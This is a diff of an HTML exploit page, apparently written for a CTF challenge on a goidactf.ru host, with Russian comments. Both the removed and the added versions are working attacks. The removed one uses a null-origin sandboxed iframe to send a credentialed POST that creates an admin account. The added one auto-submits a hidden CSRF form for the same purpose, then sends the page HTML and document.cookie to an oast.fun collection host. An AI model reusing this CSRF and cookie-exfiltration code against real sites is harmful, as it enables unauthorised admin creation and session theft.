@@ -1,85 +1,48 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Null Origin Exploit</title>
+  <meta charset="utf-8">
+  <meta name="referrer" content="unsafe-url">   <!-- максимально подробный Referer -->
 </head>
 <body>
 
-<iframe id="evil" 
-        sandbox="allow-scripts" 
-        style="width:1px;height:1px;border:none;position:absolute;left:-9999px;">
-</iframe>
+<form id="boom" 
+      action="https://tasks.goidactf.ru:20431/create_admin" 
+      method="POST"
+      referrerpolicy="unsafe-url">
+  <input type="hidden" name="new_admin_login" value="hacker_no_ssl_314159">
+</form>
 
 <script>
-const iframe = document.getElementById('evil');
+  // сразу отправляем
+  document.getElementById('boom').submit();
 
-// Минимальный payload внутри srcdoc — Origin будет null
-const innerHTML = `
-<!DOCTYPE html>
-<html>
-<body>
-<script>
-async function exploit() {
-  try {
-    const resp = await fetch("https://tasks.goidactf.ru:20431/create_admin", {
-      method: "POST",
-      mode: "cors",
-      credentials: "include",
-      headers: {
-        "Content-Type": "application/x-www-form-urlencoded"
-      },
-      body: "new_admin_login=hacker_null_1337"
-    });
-
-    let result = "";
-    if (resp.ok) {
-      result = await resp.text();
-    } else {
-      result = "STATUS_" + resp.status;
-    }
-
-    // Эксфильтрация через parent (postMessage работает с null → parent)
-    parent.postMessage({
-      type: "result",
-      data: result,
+  // ждём и смотрим, куда нас закинуло (редирект? ошибка? новая страница?)
+  setTimeout(() => {
+    const data = {
       url: window.location.href,
-      status: resp.status
-    }, "*");
+      html: document.body.innerHTML.substring(0, 2000),
+      title: document.title,
+      cookie: document.cookie || "no visible cookie"
+    };
 
-  } catch (err) {
-    parent.postMessage({
-      type: "error",
-      message: err.message || "Unknown error"
-    }, "*");
-  }
-}
-
-exploit();
-<\/script>
-</body>
-</html>
-`;
-
-iframe.srcdoc = innerHTML;
-
-// Ловим сообщение от iframe
-window.addEventListener("message", (event) => {
-  // Можно добавить проверку event.origin === "" или null, но в практике часто просто *
-  console.log("From iframe:", event.data);
-
-  // Отправляем всё себе на webhook (mode: no-cors чтобы не словить CORS на webhook)
-  fetch("https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun", {
-    method: "POST",
-    mode: "no-cors",
-    keepalive: true,
-    body: JSON.stringify(event.data)
-  });
-});
+    navigator.sendBeacon(
+      "https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun",
+      JSON.stringify(data)
+    );
+    // или классический fetch с no-cors
+    fetch("https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun", {
+      method: "POST",
+      mode: "no-cors",
+      keepalive: true,
+      body: JSON.stringify(data)
+    });
+  }, 5000);  // 5 секунд обычно хватает
 </script>
 
-<!-- Для дебага: просто видимый текст, чтобы понять, что страница загрузилась -->
-<h1>Waiting for bot...</h1>
+<noscript>
+  <meta http-equiv="refresh" content="0; url=https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun?noscript=1">
+</noscript>
 
 </body>
 </html>
